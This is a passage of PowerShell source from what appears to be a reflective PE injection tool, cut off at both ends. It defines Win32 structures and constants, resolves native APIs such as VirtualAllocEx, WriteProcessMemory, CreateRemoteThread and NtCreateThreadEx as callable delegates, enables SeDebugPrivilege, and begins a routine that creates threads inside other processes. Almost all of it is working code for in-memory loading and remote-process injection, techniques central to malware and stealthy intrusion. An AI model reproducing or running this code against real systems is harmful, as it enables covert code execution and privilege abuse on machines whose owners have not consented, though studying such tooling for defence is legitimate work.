		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
		$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		$NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
        $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
        $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
		
		return $Win32Functions
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "EndAddress", Position = 3, Mandatory = $true)]
		[IntPtr]
		$EndAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
		[IntPtr]$FinalEndAddress = [IntPtr]::Zero
		if ($PsCmdlet.ParameterSetName -eq "Size")
		{
			[IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		}
		else
		{
			$FinalEndAddress = $EndAddress
		}
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Create-RemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			#Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		#XP/Win8
		else
		{
			#Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
